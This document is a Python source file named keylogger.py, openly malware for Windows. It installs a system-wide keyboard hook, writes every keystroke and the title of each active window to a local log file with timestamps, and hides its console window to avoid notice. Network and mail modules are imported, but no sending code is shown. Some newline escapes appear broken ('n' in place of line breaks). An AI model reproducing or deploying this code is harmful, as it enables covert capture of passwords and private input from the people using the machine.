keylogger.py
---------------------------------------------------------
from threading import Timer
from threading import Thread
import subprocess, socket, base64, time, datetime, os, sys, urllib2, platform
import pythoncom, pyHook,win32api, win32gui, win32con, smtplib

# Declarations    
LOG_FILENAME = 'log_entry.txt'                 # log file name (current directory)
LOG_ACTIVE = ''     # stores active window
LOG_STATE = False    # Start keylogger as false
LOG_TIME = 0     # amount of time to log in seconds, where 0 = infinite and 86400 = 1 day
LOG_TEXT = ""     # this is the raw log var which will be written to file
LOG_TEXTSIZE = 0    # marks the beginning and end of new text blocks that separate logs
LOG_MINTERVAL = 86400           # main loop intervals in seconds, where 86400 = 1 day (default)
LOG_THREAD_kl = 0    # thread count for keylogger

# ----------------------------- #




#Setting the thread ID to current thread ID before execution.
main_thread_id = win32api.GetCurrentThreadId()


def Keylog(k, LOG_TIME, LOG_FILENAME):
 
 if os.name != 'nt': return "Not supported for this operating system.n" # checking the OS
 global LOG_TEXT, LOG_FILE, LOG_STATE, LOG_ACTIVE, main_thread_id
 LOG_STATE = True                                                        # begin logging process
 main_thread_id = win32api.GetCurrentThreadId()
 
 # Formatting and adding timestamp when log starts
 LOG_TEXT += "n+++++++++++++++++++++++++++++++++++++++++++++++++n"
 LOG_DATE = datetime.datetime.now()
 LOG_TEXT += ' ' + str(LOG_DATE) + ' [ Logging started ] |n'
 LOG_TEXT += "++++++++++++++++++++++++++++++++++++++++++++++++++++nn"

 # Find out which window is currently active
 w = win32gui
 LOG_ACTIVE = w.GetWindowText (w.GetForegroundWindow())
 LOG_DATE = datetime.datetime.now()
 LOG_TEXT += "* Activated Windows.* [" + str(LOG_DATE) + "] n"
 LOG_TEXT += "+" * len(LOG_ACTIVE) + "+++n"
 LOG_TEXT += " " + LOG_ACTIVE + " |n"
 LOG_TEXT += "+" * len(LOG_ACTIVE) + "+++nn"
 
 if LOG_TIME > 0:
  t = Timer(LOG_TIME, stopKeylog) # Quit
  t.start()
  
 # Opening the file to write
 LOG_FILE = open(LOG_FILENAME, 'w')
 LOG_FILE.write(LOG_TEXT)
 LOG_FILE.close()
 hm = pyHook.HookManager()
 hm.KeyDown = OnKeyboardEvent
 hm.HookKeyboard()
 hide()
 pythoncom.PumpMessages() # this is where all the magic happens! ;)


# Function to record key strokes
def OnKeyboardEvent(event):
 global LOG_STATE
 # return if it isn't logging.
 if LOG_STATE == False: return True
 global LOG_TEXT, LOG_FILE, LOG_FILENAME, LOG_ACTIVE
 LOG_TEXT = ""
 LOG_FILE = open(LOG_FILENAME, 'a')
 
 # check for new window activation
 wg = win32gui
 LOG_NEWACTIVE = wg.GetWindowText (wg.GetForegroundWindow())
 if LOG_NEWACTIVE != LOG_ACTIVE:
  # record it down nicely...
  LOG_DATE = datetime.datetime.now()
  LOG_TEXT += "nn* Activated Windows.* [" + str(LOG_DATE) + "] n"
  LOG_TEXT += "+" * len(LOG_NEWACTIVE) + "+++n"
  LOG_TEXT += " " + LOG_NEWACTIVE + " |n"
  LOG_TEXT += "+" * len(LOG_NEWACTIVE) + "+++nn"
  LOG_ACTIVE = LOG_NEWACTIVE
  LOG_FILE.write(LOG_TEXT)
 
 LOG_TEXT = "" 
 if event.Ascii == 8:
                LOG_TEXT += "<Backspace>"
 elif event.Ascii == 13:
                LOG_TEXT += "<Enter>"
 elif event.Ascii == 9:
                LOG_TEXT += "<Horizontal tab>"
 else: LOG_TEXT += str(chr(event.Ascii))
 # write to file
 LOG_FILE.write(LOG_TEXT) 
 LOG_FILE.close()
 
 return True

    # begin keylogging
kl = Thread(target=Keylog, args=(LOG_THREAD_kl,LOG_TIME,LOG_FILENAME))
kl.start()

#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True
sys.exit()